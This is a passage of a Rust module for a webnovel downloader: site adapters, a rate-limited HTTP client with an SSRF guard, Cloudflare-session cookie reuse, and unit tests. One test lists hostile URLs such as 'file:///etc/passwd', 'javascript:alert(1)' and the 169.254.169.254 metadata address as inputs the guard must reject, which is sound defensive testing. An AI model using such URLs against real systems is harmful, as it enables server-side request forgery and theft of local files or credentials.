//! # api::novel
//!
//! Webnovel source adapters: fetch a novel's table of contents and download
//! individual chapters as sanitized XHTML for EPUB packaging.
//!
//! ## Responsibilities:
//! - `NovelSource` trait — the adapter contract
//! - `PoliteClient` — blocking HTTP with per-host rate limiting and retries
//! - Shared HTML utilities (content extraction, XHTML sanitizing)
//! - `detect_source` — host-based adapter dispatch
//!
//! ## Adapter convention
//! All adapters return chapters **oldest-first** (reading order).
//!
//! ## Dependencies:
//! - `scraper` – HTML parsing
//! - `reqwest::blocking` – synchronous HTTP inside URI-scheme handler threads

pub mod chikari;
pub mod generic;
pub mod lightnovelpub;
pub mod novelarrow;
pub mod novelfire;
pub mod novelfull;
pub mod novelight;
pub mod novelphoenix;
pub mod novelupdates;
pub mod royalroad;
pub mod status;
pub mod wordpress;
pub mod wtrlab;

use std::collections::HashMap;
use std::io::Read;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, ToSocketAddrs};
use std::sync::{Arc, LazyLock, Mutex};
use std::time::{Duration, Instant};

use scraper::{Html, Selector};

use crate::error::{FeroError, Result};

// Sanitizing lives at the EPUB boundary in `core`; adapters use the same
// implementation while downloading, and the writer repeats it before output.
pub use crate::core::epub::sanitize_xhtml_fragment as sanitize_to_xhtml;

// ---------------------------------------------------------------------------
// Shared types
// ---------------------------------------------------------------------------

/// Novel metadata plus the full chapter list, as scraped from the source.
#[derive(Debug, Clone)]
pub struct NovelInfo {
    /// Novel title.
    pub title: String,
    /// Author, if exposed by the source.
    pub author: Option<String>,
    /// Cover image URL, if exposed by the source.
    pub cover_url: Option<String>,
    /// Synopsis, if exposed by the source.
    pub description: Option<String>,
    /// `Some(true)` when the source marks the novel as finished.
    pub completed_hint: Option<bool>,
    /// When the newest chapter went up at the source, where the page says so.
    ///
    /// Only NovelUpdates prints release dates reliably; everywhere else this
    /// stays `None`, which is a normal answer rather than a gap to fill in.
    pub latest_release_unix: Option<u64>,
    /// Genre names as listed by the source (may be empty).
    pub genres: Vec<String>,
    /// Free-form tags as listed by the source (may be empty).
    pub tags: Vec<String>,
    /// All chapters in reading order (oldest first).
    pub chapters: Vec<ChapterRef>,
}

/// A single chapter reference from a table of contents.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ChapterRef {
    /// Chapter title as listed in the ToC.
    pub title: String,
    /// Absolute chapter URL.
    pub url: String,
}

/// Downloaded and sanitized chapter content.
#[derive(Debug, Clone)]
pub struct ChapterContent {
    /// Chapter title (may be refined from the chapter page itself).
    pub title: String,
    /// Sanitized XHTML body fragment.
    pub xhtml: String,
}

/// Contract for one webnovel hosting site (or aggregator).
pub trait NovelSource {
    /// Stable adapter id (`royalroad`, `wordpress`, `generic`, `novelupdates`).
    fn id(&self) -> &'static str;

    /// Fetches the novel overview page and parses metadata plus the full ToC.
    fn fetch_novel_info(&self, client: &PoliteClient, url: &str) -> Result<NovelInfo>;

    /// Fetches one chapter page and extracts its sanitized content.
    fn fetch_chapter(&self, client: &PoliteClient, chapter: &ChapterRef) -> Result<ChapterContent>;
}

/// Picks the adapter for a subscription URL based on its host.
///
/// Unknown hosts fall back to the heuristic [`generic::GenericSource`].
pub fn detect_source(url: &str) -> Box<dyn NovelSource> {
    let host = host_of(url).unwrap_or_default();
    if host_matches(&host, "royalroad.com") {
        Box::new(royalroad::RoyalRoadSource)
    } else if host_matches(&host, "divinedaolibrary.com") {
        Box::new(wordpress::WordPressSource)
    } else if host_matches(&host, "novelfull.com")
        || host_matches(&host, "novelfull.net")
        || host_matches(&host, "novgo.net")
        || host_matches(&host, "readnovelfull.com")
    {
        // NovelFull and its engine clones share markup (incl. the AJAX
        // chapter archive on readnovelfull-style sites).
        Box::new(novelfull::NovelFullSource)
    } else if host_matches(&host, "novelight.net") {
        Box::new(novelight::NovelightSource)
    } else if host_matches(&host, "novelphoenix.com") {
        Box::new(novelphoenix::NovelPhoenixSource)
    } else if host_matches(&host, "lightnovelpub.me") {
        Box::new(lightnovelpub::LightNovelPubSource)
    } else if host_matches(&host, "chikari.moe") {
        Box::new(chikari::ChikariSource)
    } else if host_matches(&host, "novelfire.net") {
        Box::new(novelfire::NovelFireSource)
    } else if host_matches(&host, "novelupdates.com") {
        Box::new(novelupdates::NovelUpdatesSource)
    } else if host_matches(&host, "wtr-lab.com") {
        // Next.js-Anwendung: Metadaten im __NEXT_DATA__, Kapitelliste und
        // Kapiteltext je hinter einem eigenen API-Aufruf.
        Box::new(wtrlab::WtrLabSource)
    } else if host_matches(&host, "novelarrow.com") {
        // JS-rendered SPA — fetched through the browser window; dedicated
        // adapter reads the full chapter list from the "chapters" tab.
        Box::new(novelarrow::NovelArrowSource)
    } else {
        // Everything else — incl. novellunar.com (JS-rendered) and
        // freewebnovel.com (Cloudflare) — runs through the heuristic parser.
        // For the webview-routed hosts the browser window supplies the
        // fully-rendered HTML, which the heuristic parses like any other page.
        Box::new(generic::GenericSource)
    }
}

/// Exact host-or-subdomain match without accepting lookalike domains such as
/// `notnovelfire.net`.
fn host_matches(host: &str, expected: &str) -> bool {
    host == expected || host.ends_with(&format!(".{expected}"))
}

// ---------------------------------------------------------------------------
// Polite HTTP client
// ---------------------------------------------------------------------------

/// Identifies the app to site operators; deliberately descriptive.
const USER_AGENT: &str = "Fero/0.1 (personal library tool)";
/// Default minimum spacing between two requests to the same host.
pub const DEFAULT_REQUEST_DELAY_MS: u64 = 1_500;
/// Minimum spacing between two image requests to the same host.
///
/// Page images live on CDNs that browsers hit with a dozen parallel requests
/// per page view; the pacing that protects a scraped HTML endpoint would make
/// a single manga chapter take minutes.  This stays sequential and throttled,
/// just at a cadence the CDN already expects.
const IMAGE_REQUEST_DELAY_MS: u64 = 250;
/// Lower bound for the configurable delay — anything faster risks IP bans.
pub const MIN_ALLOWED_DELAY_MS: u64 = 500;
/// Upper bound for the configurable delay.
pub const MAX_ALLOWED_DELAY_MS: u64 = 5_000;
/// Per-request timeout.
const REQUEST_TIMEOUT_SECS: u64 = 30;
/// Largest decompressed HTML/API response kept in memory.
const MAX_TEXT_RESPONSE_BYTES: usize = 32 * 1024 * 1024;
/// Largest cover or manga page accepted by the shared HTTP layer.
///
/// Manga validates the same limit again before writing a CBZ. Enforcing it
/// while reading is what prevents a hostile or broken server from exhausting
/// memory before that validation gets a chance to run.
const MAX_BINARY_RESPONSE_BYTES: usize = 20 * 1024 * 1024;
/// Retry attempts on transient failures (429/5xx/network).
const MAX_RETRIES: u32 = 3;
/// Backoff before each retry attempt, in seconds.
const RETRY_BACKOFF_SECS: [u64; 3] = [2, 5, 12];

/// Browser session (cookies + matching user agent) captured from the
/// interactive Cloudflare-solve window, keyed by host.
#[derive(Debug, Clone)]
pub struct BrowserSession {
    /// Full `Cookie` header value ("name=value; name2=value2").
    pub cookie_header: String,
    /// User agent the cookies were issued for — must match on reuse.
    pub user_agent: String,
}

/// Hosts whose pages must be fetched through the embedded browser window,
/// not plain HTTP — either Cloudflare binds clearance to the browser's TLS
/// fingerprint (novelupdates, freewebnovel, lightnovelpub, novelfire) or the
/// content is rendered client-side by JavaScript (novellunar, novelarrow).
/// These are only ever routed on an explicit, manual user action (never in
/// background checks).
pub const WEBVIEW_ROUTED_HOSTS: [&str; 6] = [
    "novelupdates.com",
    "novellunar.com",
    "novelarrow.com",
    "freewebnovel.com",
    "lightnovelpub.me",
    "novelfire.net",
];

/// Returns true when a URL's host must go through the browser window.
pub fn is_webview_routed(url: &str) -> bool {
    host_of(url)
        .map(|host| {
            WEBVIEW_ROUTED_HOSTS
                .iter()
                .any(|routed| host == *routed || host.ends_with(&format!(".{routed}")))
        })
        .unwrap_or(false)
}

/// A fetcher that returns fully-rendered HTML for a URL by driving an embedded
/// browser window. Set on a [`PoliteClient`] for manual, whitelisted checks.
pub type RenderedFetcher = Arc<dyn Fn(&str) -> Result<String> + Send + Sync>;

/// RAM-only session store — clearance cookies are short-lived anyway.
static BROWSER_SESSIONS: LazyLock<Mutex<HashMap<String, BrowserSession>>> =
    LazyLock::new(|| Mutex::new(HashMap::new()));

/// Shared request timestamps across all clients and both download engines.
///
/// Clients can have different configured delays per subscription, but they
/// must still respect one another when they address the same host.
static LAST_REQUESTS: LazyLock<Mutex<HashMap<String, Instant>>> =
    LazyLock::new(|| Mutex::new(HashMap::new()));

/// Registers a solved-challenge session for a host.
pub fn set_browser_session(host: &str, session: BrowserSession) {
    if let Ok(mut sessions) = BROWSER_SESSIONS.lock() {
        sessions.insert(host.to_lowercase(), session);
    }
}

/// Returns the stored session for a URL's host, if one exists.
pub fn browser_session_for(url: &str) -> Option<BrowserSession> {
    let host = host_of(url)?;
    BROWSER_SESSIONS.lock().ok()?.get(&host).cloned()
}

/// Removes any stored session for a host (used on logout).
pub fn clear_browser_session(host: &str) {
    if let Ok(mut sessions) = BROWSER_SESSIONS.lock() {
        sessions.remove(&host.to_lowercase());
    }
}

/// Blocking HTTP client with per-host rate limiting and bounded retries.
///
/// All webnovel network traffic goes through this client so politeness rules
/// are enforced in one place.  Requests are strictly sequential per client.
pub struct PoliteClient {
    client: reqwest::blocking::Client,
    /// Minimum spacing between two requests to the same host.
    min_delay: Duration,
    /// Minimum spacing between two image requests to the same host.
    image_delay: Duration,
    /// When set, whitelisted hosts are fetched through the browser window
    /// instead of plain HTTP (rendered HTML / TLS-bound Cloudflare sessions).
    renderer: Option<RenderedFetcher>,
}

impl PoliteClient {
    /// Builds the client with the shared timeout and user agent.
    ///
    /// # Errors
    /// - `FeroError::ExternalApi` if the TLS backend fails to initialize
    pub fn new() -> Result<Self> {
        Self::with_delay_ms(DEFAULT_REQUEST_DELAY_MS)
    }

    /// Builds the client with a custom per-host delay.
    ///
    /// The delay is clamped to `[500, 5000]` ms — faster would risk IP bans
    /// on the source sites, slower is pointless.
    ///
    /// # Errors
    /// - `FeroError::ExternalApi` if the TLS backend fails to initialize
    pub fn with_delay_ms(delay_ms: u64) -> Result<Self> {
        let delay_ms = clamp_request_delay_ms(delay_ms);
        let client = reqwest::blocking::Client::builder()
            .user_agent(USER_AGENT)
            .timeout(Duration::from_secs(REQUEST_TIMEOUT_SECS))
            // A source page controls its redirect targets. Validate every hop
            // so a public page cannot bounce Fero into localhost, a NAS or a
            // cloud instance metadata service.
            .redirect(reqwest::redirect::Policy::custom(|attempt| {
                if attempt.previous().len() >= 10 {
                    return attempt.error("too many redirects");
                }
                match validate_parsed_remote_url(attempt.url(), true) {
                    Ok(()) => attempt.follow(),
                    Err(error) => attempt.error(std::io::Error::other(error.to_string())),
                }
            }))
            .build()
            .map_err(|e| FeroError::ExternalApi(format!("HTTP client init failed: {e}")))?;
        Ok(Self {
            client,
            min_delay: Duration::from_millis(delay_ms),
            // A user who slows the client down expects that to apply to images
            // too, so the image delay never exceeds the page delay.
            image_delay: Duration::from_millis(IMAGE_REQUEST_DELAY_MS.min(delay_ms)),
            renderer: None,
        })
    }

    /// Attaches a browser-window fetcher for whitelisted hosts. Used only for
    /// manual, user-initiated checks (never in background runs).
    pub fn with_renderer(mut self, renderer: RenderedFetcher) -> Self {
        self.renderer = Some(renderer);
        self
    }

    /// Fetches a URL and returns `(final_url, body_text)`.
    ///
    /// Redirects are followed (reqwest default); `final_url` is the URL after
    /// redirects, which matters for aggregator links (NovelUpdates).  Applies
    /// the per-host delay, retries transient errors with fixed backoff, and
    /// maps Cloudflare challenges to a descriptive error.
    ///
    /// # Errors
    /// - `FeroError::ExternalApi` on HTTP errors after retries are exhausted
    pub fn get_text(&self, url: &str) -> Result<(String, String)> {
        self.get_text_with(url, &[])
    }

    /// Like [`Self::get_text`], with extra request headers.
    ///
    /// Used by adapters that need a site-specific header to see the real page
    /// — FanFox hides most of its chapter list behind an `isAdult` cookie.
    /// Headers are additive; a stored browser session still wins for `Cookie`
    /// and `User-Agent` so a solved challenge is never overwritten.
    ///
    /// # Errors
    /// - `FeroError::ExternalApi` on HTTP errors after retries are exhausted
    pub fn get_text_with(&self, url: &str, headers: &[(&str, &str)]) -> Result<(String, String)> {
        validate_remote_url(url)?;
        // Whitelisted hosts go through the browser window when a renderer is
        // attached — plain HTTP either can't pass Cloudflare (TLS-bound) or
        // never sees the JS-rendered content.
        if is_webview_routed(url) {
            if let Some(renderer) = &self.renderer {
                self.respect_delay(url);
                let html = renderer(url)?;
                return Ok((url.to_string(), html));
            }
        }
        let mut attempt = 0;
        loop {
            self.respect_delay(url);
            match self.try_get(url, headers) {
                Ok(result) => return Ok(result),
                Err(RequestFailure::Fatal(error)) => return Err(error),
                Err(RequestFailure::Transient(error)) => {
                    if attempt as usize >= RETRY_BACKOFF_SECS.len() || attempt >= MAX_RETRIES {
                        return Err(error);
                    }
                    std::thread::sleep(Duration::from_secs(RETRY_BACKOFF_SECS[attempt as usize]));
                    attempt += 1;
                }
            }
        }
    }

    /// Fetches a URL and returns the raw body bytes (for cover images).
    ///
    /// Applies the same per-host delay and retry rules as [`Self::get_text`].
    ///
    /// # Errors
    /// - `FeroError::ExternalApi` on HTTP errors after retries are exhausted
    pub fn get_bytes(&self, url: &str) -> Result<Vec<u8>> {
        self.fetch_bytes(url, None, self.min_delay)
    }

    /// Fetches a page image, optionally sending a `Referer` header.
    ///
    /// # Parameters
    /// - `url` – Absolute image URL
    /// - `referer` – Page the image is embedded in; some CDNs (Webtoons)
    ///   answer `403` without it
    ///
    /// # Returns
    /// - `Ok(Vec<u8>)` – Raw image bytes; the caller validates the format
    ///
    /// # Errors
    /// - `FeroError::ExternalApi` on HTTP errors after retries are exhausted
    pub fn get_image(&self, url: &str, referer: Option<&str>) -> Result<Vec<u8>> {
        self.fetch_bytes(url, referer, self.image_delay)
    }

    /// Shared retry loop behind [`Self::get_bytes`] and [`Self::get_image`].
    fn fetch_bytes(&self, url: &str, referer: Option<&str>, delay: Duration) -> Result<Vec<u8>> {
        validate_remote_url(url)?;
        if let Some(referer) = referer {
            // Referer is only a header, but accepting control characters or a
            // non-web scheme here would still let hostile adapter data poison
            // the request builder.
            validate_remote_url_syntax(referer)?;
        }
        let mut attempt = 0;
        loop {
            self.respect_delay_with(url, delay);
            match self.try_get_bytes(url, referer) {
                Ok(bytes) => return Ok(bytes),
                Err(RequestFailure::Fatal(error)) => return Err(error),
                Err(RequestFailure::Transient(error)) => {
                    if attempt as usize >= RETRY_BACKOFF_SECS.len() || attempt >= MAX_RETRIES {
                        return Err(error);
                    }
                    std::thread::sleep(Duration::from_secs(RETRY_BACKOFF_SECS[attempt as usize]));
                    attempt += 1;
                }
            }
        }
    }

    fn try_get_bytes(
        &self,
        url: &str,
        referer: Option<&str>,
    ) -> std::result::Result<Vec<u8>, RequestFailure> {
        let mut request = self.client.get(url);
        if let Some(referer) = referer {
            request = request.header("Referer", referer);
        }
        if let Some(session) = browser_session_for(url) {
            request = request
                .header("Cookie", session.cookie_header)
                .header("User-Agent", session.user_agent);
        }
        let response = request.send().map_err(|e| {
            RequestFailure::Transient(FeroError::ExternalApi(format!(
                "request to {url} failed: {e}"
            )))
        })?;
        let status = response.status();
        if status.as_u16() == 429 || status.is_server_error() {
            return Err(RequestFailure::Transient(FeroError::ExternalApi(format!(
                "{url} answered with status {status}"
            ))));
        }
        if !status.is_success() {
            return Err(RequestFailure::Fatal(FeroError::ExternalApi(format!(
                "{url} answered with status {status}"
            ))));
        }
        if response
            .content_length()
            .is_some_and(|length| length > MAX_BINARY_RESPONSE_BYTES as u64)
        {
            return Err(response_too_large(url, MAX_BINARY_RESPONSE_BYTES));
        }
        let bytes = read_limited(response, MAX_BINARY_RESPONSE_BYTES).map_err(|e| {
            RequestFailure::Transient(FeroError::ExternalApi(format!(
                "reading body of {url} failed: {e}"
            )))
        })?;
        if bytes.len() > MAX_BINARY_RESPONSE_BYTES {
            return Err(response_too_large(url, MAX_BINARY_RESPONSE_BYTES));
        }
        Ok(bytes)
    }

    fn try_get(
        &self,
        url: &str,
        headers: &[(&str, &str)],
    ) -> std::result::Result<(String, String), RequestFailure> {
        let mut request = self.client.get(url);
        for (name, value) in headers {
            request = request.header(*name, *value);
        }
        Self::send_for_text(request, url)
    }

    /// Posts a JSON body and returns the response text.
    ///
    /// The one place Fero sends rather than asks. It exists because not every
    /// source hands its chapter text out over a plain URL — WTR-Lab answers
    /// only a `POST` naming the novel and the chapter number. The per-host
    /// delay, the retries and the Cloudflare handling are the same as for a
    /// `GET`: from the far end this is one more request against one more host.
    ///
    /// Not routed through the browser window, unlike [`Self::get_text`]: the
    /// renderer can only be asked to open a URL, and there is no way to make it
    /// send a body.
    ///
    /// # Errors
    /// - `FeroError::ExternalApi` on HTTP errors after retries are exhausted
    pub fn post_json(&self, url: &str, body: String, headers: &[(&str, &str)]) -> Result<String> {
        validate_remote_url(url)?;
        let mut attempt = 0;
        loop {
            self.respect_delay(url);
            let mut request = self
                .client
                .post(url)
                .header("Content-Type", "application/json")
                .header("Accept", "application/json")
                .body(body.clone());
            for (name, value) in headers {
                request = request.header(*name, *value);
            }
            match Self::send_for_text(request, url) {
                Ok((_, text)) => return Ok(text),
                Err(RequestFailure::Fatal(error)) => return Err(error),
                Err(RequestFailure::Transient(error)) => {
                    if attempt as usize >= RETRY_BACKOFF_SECS.len() || attempt >= MAX_RETRIES {
                        return Err(error);
                    }
                    std::thread::sleep(Duration::from_secs(RETRY_BACKOFF_SECS[attempt as usize]));
                    attempt += 1;
                }
            }
        }
    }

    /// Sends a prepared request and reads the body as text.
    ///
    /// Shared by `GET` and `POST`: a Cloudflare challenge, a 429 and a 5xx mean
    /// the same thing whichever verb produced them, and a second copy of that
    /// judgement would be a second thing to keep correct.
    fn send_for_text(
        request: reqwest::blocking::RequestBuilder,
        url: &str,
    ) -> std::result::Result<(String, String), RequestFailure> {
        // A manually solved Cloudflare challenge leaves cookies + UA here;
        // sending them lets subsequent plain requests pass the check.
        let request = match browser_session_for(url) {
            Some(session) => request
                .header("Cookie", session.cookie_header)
                .header("User-Agent", session.user_agent),
            None => request,
        };
        let response = request.send().map_err(|e| {
            if e.is_timeout() || e.is_connect() {
                RequestFailure::Transient(FeroError::ExternalApi(format!(
                    "request to {url} failed: {e}"
                )))
            } else {
                RequestFailure::Fatal(FeroError::ExternalApi(format!(
                    "request to {url} failed: {e}"
                )))
            }
        })?;

        let status = response.status();
        let final_url = response.url().to_string();

        if status.as_u16() == 429 || status.is_server_error() {
            // Cloudflare challenges answer with 403/503 and a server header;
            // 403 is handled below because retrying a challenge is pointless.
            if is_cloudflare_challenge(&response) {
                return Err(RequestFailure::Fatal(cloudflare_error(url)));
            }
            return Err(RequestFailure::Transient(FeroError::ExternalApi(format!(
                "{url} answered with status {status}"
            ))));
        }
        if status.as_u16() == 403 && is_cloudflare_challenge(&response) {
            return Err(RequestFailure::Fatal(cloudflare_error(url)));
        }
        if !status.is_success() {
            return Err(RequestFailure::Fatal(FeroError::ExternalApi(format!(
                "{url} answered with status {status}"
            ))));
        }

        if response
            .content_length()
            .is_some_and(|length| length > MAX_TEXT_RESPONSE_BYTES as u64)
        {
            return Err(response_too_large(url, MAX_TEXT_RESPONSE_BYTES));
        }
        let body = read_limited(response, MAX_TEXT_RESPONSE_BYTES).map_err(|e| {
            RequestFailure::Transient(FeroError::ExternalApi(format!(
                "reading body of {url} failed: {e}"
            )))
        })?;
        if body.len() > MAX_TEXT_RESPONSE_BYTES {
            return Err(response_too_large(url, MAX_TEXT_RESPONSE_BYTES));
        }
        Ok((final_url, String::from_utf8_lossy(&body).into_owned()))
    }

    /// Sleeps just long enough to honor the per-host minimum request spacing.
    fn respect_delay(&self, url: &str) {
        self.respect_delay_with(url, self.min_delay);
    }

    /// Like [`Self::respect_delay`], with an explicit spacing.
    fn respect_delay_with(&self, url: &str, min_delay: Duration) {
        let Some(host) = host_of(url) else {
            return;
        };
        let wait = {
            let Ok(mut map) = LAST_REQUESTS.lock() else {
                return; // Poisoned lock: skip the delay rather than aborting.
            };
            let now = Instant::now();
            let wait = map
                .get(&host)
                .and_then(|last| min_delay.checked_sub(now.duration_since(*last)))
                .unwrap_or(Duration::ZERO);
            map.insert(host, now + wait);
            wait
        };
        if !wait.is_zero() {
            std::thread::sleep(wait);
        }
    }
}

/// Keeps user-configured request pacing inside the safe range shared by both
/// download engines.
pub fn clamp_request_delay_ms(delay_ms: u64) -> u64 {
    delay_ms.clamp(MIN_ALLOWED_DELAY_MS, MAX_ALLOWED_DELAY_MS)
}

/// Reads at most one byte beyond `limit`, enough to distinguish an exact-size
/// response from an oversized one without buffering the rest of the stream.
fn read_limited(mut reader: impl Read, limit: usize) -> std::io::Result<Vec<u8>> {
    let mut body = Vec::with_capacity(limit.min(64 * 1024));
    reader
        .by_ref()
        .take(limit.saturating_add(1) as u64)
        .read_to_end(&mut body)?;
    Ok(body)
}

fn response_too_large(url: &str, limit: usize) -> RequestFailure {
    RequestFailure::Fatal(FeroError::ExternalApi(format!(
        "response from {url} exceeds the {} MiB limit",
        limit / (1024 * 1024)
    )))
}

/// Distinguishes retryable failures from permanent ones.
enum RequestFailure {
    Transient(FeroError),
    Fatal(FeroError),
}

fn cloudflare_error(url: &str) -> FeroError {
    FeroError::ExternalApi(format!(
        "Die Seite blockiert automatische Zugriffe (Cloudflare-Schutz): {url}"
    ))
}

fn is_cloudflare_challenge(response: &reqwest::blocking::Response) -> bool {
    response
        .headers()
        .get("server")
        .and_then(|value| value.to_str().ok())
        .map(|server| server.to_ascii_lowercase().contains("cloudflare"))
        .unwrap_or(false)
}

// ---------------------------------------------------------------------------
// Shared HTML utilities
// ---------------------------------------------------------------------------

/// Extracts the normalized host part of an absolute URL.
pub fn host_of(url: &str) -> Option<String> {
    let parsed = reqwest::Url::parse(url).ok()?;
    parsed.host_str().map(normalized_host)
}

fn normalized_host(host: &str) -> String {
    host.trim_start_matches('[')
        .trim_end_matches(']')
        .trim_end_matches('.')
        .to_ascii_lowercase()
}

/// Rejects network targets that a downloaded page must never be able to make
/// the desktop app contact: non-web schemes, embedded credentials, localhost,
/// private/link-local IP space and hostnames resolving into those ranges.
pub fn validate_remote_url(url: &str) -> Result<()> {
    let parsed = reqwest::Url::parse(url).map_err(|_| unsafe_url_error(url, "ungültige URL"))?;
    validate_parsed_remote_url(&parsed, true)
}

/// Cheap navigation check for foreign WebViews. DNS resolution is done before
/// their initial URL is opened; this callback must remain quick while still
/// blocking custom schemes and literal local/private destinations on every
/// later page navigation.
pub fn is_safe_remote_navigation(url: &reqwest::Url) -> bool {
    validate_parsed_remote_url(url, false).is_ok()
}

fn validate_remote_url_syntax(url: &str) -> Result<()> {
    let parsed = reqwest::Url::parse(url).map_err(|_| unsafe_url_error(url, "ungültige URL"))?;
    validate_parsed_remote_url(&parsed, false)
}

fn validate_parsed_remote_url(url: &reqwest::Url, resolve_dns: bool) -> Result<()> {
    if !matches!(url.scheme(), "http" | "https") {
        return Err(unsafe_url_error(url.as_str(), "nur HTTP(S) ist erlaubt"));
    }
    if !url.username().is_empty() || url.password().is_some() {
        return Err(unsafe_url_error(
            url.as_str(),
            "eingebettete Zugangsdaten sind nicht erlaubt",
        ));
    }
    let host = url
        .host_str()
        .map(normalized_host)
        .filter(|host| !host.is_empty())
        .ok_or_else(|| unsafe_url_error(url.as_str(), "Host fehlt"))?;

    if host == "localhost"
        || host.ends_with(".localhost")
        || host.ends_with(".local")
        || host.ends_with(".internal")
        || host == "home.arpa"
        || host.ends_with(".home.arpa")
    {
        return Err(unsafe_url_error(url.as_str(), "lokaler Host ist gesperrt"));
    }

    if let Ok(ip) = host.parse::<IpAddr>() {
        if is_non_public_ip(ip) {
            return Err(unsafe_url_error(
                url.as_str(),
                "private oder lokale IP-Adresse ist gesperrt",
            ));
        }
        return Ok(());
    }

    if resolve_dns {
        let port = url.port_or_known_default().unwrap_or(443);
        let addresses = (host.as_str(), port)
            .to_socket_addrs()
            .map_err(|error| unsafe_url_error(url.as_str(), &format!("DNS-Fehler: {error}")))?
            .collect::<Vec<_>>();
        if addresses.is_empty() {
            return Err(unsafe_url_error(url.as_str(), "Host hat keine Adresse"));
        }
        if addresses
            .iter()
            .any(|address| is_non_public_ip(address.ip()))
        {
            return Err(unsafe_url_error(
                url.as_str(),
                "Host verweist auf ein privates oder lokales Netz",
            ));
        }
    }

    Ok(())
}

fn is_non_public_ip(ip: IpAddr) -> bool {
    match ip {
        IpAddr::V4(ip) => is_non_public_ipv4(ip),
        IpAddr::V6(ip) => is_non_public_ipv6(ip),
    }
}

fn is_non_public_ipv4(ip: Ipv4Addr) -> bool {
    let [a, b, c, _] = ip.octets();
    ip.is_private()
        || ip.is_loopback()
        || ip.is_link_local()
        || ip.is_unspecified()
        || ip.is_multicast()
        || a == 0
        || (a == 100 && (64..=127).contains(&b))
        || (a == 192 && b == 0 && c == 0)
        || (a == 192 && b == 0 && c == 2)
        || (a == 198 && (b == 18 || b == 19))
        || (a == 198 && b == 51 && c == 100)
        || (a == 203 && b == 0 && c == 113)
        || a >= 240
}

fn is_non_public_ipv6(ip: Ipv6Addr) -> bool {
    if let Some(v4) = ip.to_ipv4_mapped() {
        return is_non_public_ipv4(v4);
    }
    let first = ip.segments()[0];
    ip.is_loopback()
        || ip.is_unspecified()
        || ip.is_multicast()
        || first & 0xfe00 == 0xfc00 // unique-local fc00::/7
        || first & 0xffc0 == 0xfe80 // link-local fe80::/10
        || first & 0xffc0 == 0xfec0 // deprecated site-local fec0::/10
}

fn unsafe_url_error(url: &str, reason: &str) -> FeroError {
    FeroError::ExternalApi(format!(
        "Unsicheres Netzwerkziel abgelehnt ({reason}): {url}"
    ))
}

/// Resolves an `href` against the page URL it appeared on.
pub fn absolutize(base_url: &str, href: &str) -> String {
    let href = href.trim();
    reqwest::Url::parse(base_url)
        .and_then(|base| base.join(href))
        .map(|url| url.to_string())
        .unwrap_or_else(|_| href.to_string())
}

/// Extracts the page's `og:image` URL — the most reliable cover source on
/// modern sites (RoyalRoad, WordPress/Fictioneer themes all provide it).
pub fn og_image(html: &Html) -> Option<String> {
    let selector = Selector::parse("meta[property='og:image']").ok()?;
    html.select(&selector)
        .next()?
        .value()
        .attr("content")
        .map(str::to_string)
        .filter(|url| !url.is_empty())
}

/// Detects an image's MIME type from its magic bytes.
///
/// Returns `None` for anything that is not JPEG/PNG/WebP/GIF — e.g. an HTML
/// error page served instead of an image — so callers can discard bad
/// downloads.
pub fn detect_image_media_type(bytes: &[u8]) -> Option<&'static str> {
    if bytes.len() < 12 {
        return None;
    }
    if bytes.starts_with(&[0xFF, 0xD8, 0xFF]) {
        return Some("image/jpeg");
    }
    if bytes.starts_with(&[0x89, b'P', b'N', b'G']) {
        return Some("image/png");
    }
    if &bytes[0..4] == b"RIFF" && &bytes[8..12] == b"WEBP" {
        return Some("image/webp");
    }
    // Scanlation pages are occasionally GIF; both EPUB and CBZ readers handle
    // it, so accepting it is better than discarding the download.
    if bytes.starts_with(b"GIF87a") || bytes.starts_with(b"GIF89a") {
        return Some("image/gif");
    }
    None
}

/// Returns the inner HTML of the first element matching any of `selectors`
/// (tried in priority order).
pub fn extract_content(html: &Html, selectors: &[&str]) -> Option<String> {
    for raw_selector in selectors {
        let Ok(selector) = Selector::parse(raw_selector) else {
            continue;
        };
        if let Some(element) = html.select(&selector).next() {
            return Some(element.inner_html());
        }
    }
    None
}

/// Heuristic: does a link's text look like a chapter entry?
///
/// Implemented by hand because the project intentionally avoids a regex
/// dependency.  Matches `chapter`/`kapitel` substrings, `ch` + digits, and
/// titles that start with a number.
pub fn looks_like_chapter_text(text: &str) -> bool {
    let lower = text.trim().to_lowercase();
    if lower.is_empty() {
        return false;
    }
    if lower.contains("chapter") || lower.contains("kapitel") || lower.contains("episode") {
        return true;
    }
    // "ch 12", "ch. 12", "ch12"
    if let Some(rest) = lower.strip_prefix("ch") {
        let rest = rest.trim_start_matches(['.', ' ']);
        if rest.chars().next().is_some_and(|c| c.is_ascii_digit()) {
            return true;
        }
    }
    // Titles starting with a number ("12 - The Fall", "103. Rebirth").
    lower.chars().next().is_some_and(|c| c.is_ascii_digit())
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Cursor;

    #[test]
    fn bounded_reader_stops_one_byte_after_the_limit() {
        let body = vec![b'x'; 64];

        assert_eq!(read_limited(Cursor::new(&body), 64).unwrap().len(), 64);
        assert_eq!(read_limited(Cursor::new(&body), 16).unwrap().len(), 17);
    }

    #[test]
    fn host_extraction() {
        assert_eq!(
            host_of("https://www.royalroad.com/fiction/1"),
            Some("www.royalroad.com".to_string())
        );
        assert_eq!(
            host_of("https://example.com:8080/x?y#z"),
            Some("example.com".to_string())
        );
        assert_eq!(host_of("not a url"), None);
    }

    #[test]
    fn network_guard_rejects_local_private_and_non_web_targets() {
        for url in [
            "file:///etc/passwd",
            "javascript:alert(1)",
            "http://localhost/admin",
            "http://service.internal/",
            "http://127.0.0.1/",
            "http://169.254.169.254/latest/meta-data/",
            "http://10.0.0.1/",
            "http://172.16.0.1/",
            "http://192.168.1.1/",
            "http://[::1]/",
            "http://[fe80::1]/",
            "https://user:secret@example.com/",
        ] {
            let parsed = reqwest::Url::parse(url).expect("test URL should parse");
            assert!(
                validate_parsed_remote_url(&parsed, false).is_err(),
                "unsafe target was accepted: {url}"
            );
        }
    }

    #[test]
    fn network_guard_accepts_public_http_addresses() {
        for url in [
            "https://example.com/book/1",
            "http://93.184.216.34/chapter/2",
            "https://[2606:4700:4700::1111]/",
        ] {
            let parsed = reqwest::Url::parse(url).expect("test URL should parse");
            assert!(
                validate_parsed_remote_url(&parsed, false).is_ok(),
                "public target was rejected: {url}"
            );
        }
    }

    #[test]
    fn absolutize_variants() {
        assert_eq!(
            absolutize("https://a.com/novel/", "https://b.com/x"),
            "https://b.com/x"
        );
        assert_eq!(
